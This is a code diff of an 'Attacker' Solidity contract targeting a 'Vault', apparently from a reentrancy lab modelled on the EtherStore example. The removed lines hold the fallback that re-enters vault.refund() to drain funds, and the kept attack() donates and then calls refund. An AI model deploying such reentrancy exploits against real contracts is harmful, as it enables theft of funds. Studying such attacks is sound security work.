@@ -32,7 +32,7 @@ import "./Vault.sol";
 
 contract Attacker {
     Vault public vault;
-    uint256 public constant AMOUNT = 100_000 gwei;
+    uint256 public constant AMOUNT = 1 ether;
 
     constructor(address _vaultAddress) {
         vault = Vault(_vaultAddress);
@@ -44,15 +44,8 @@ contract Attacker {
         }
     }
 
-    // Fallback is called when EtherStore sends Ether to this contract.
-    fallback() external payable {
-        if (address(vault).balance >= AMOUNT) {
-            vault.refund();
-        }
-    }
-
     function attack() external payable {
-        require(msg.value >= AMOUNT);
+        // require(msg.value >= AMOUNT);
         vault.donate{value: AMOUNT}();
         vault.refund();
     }
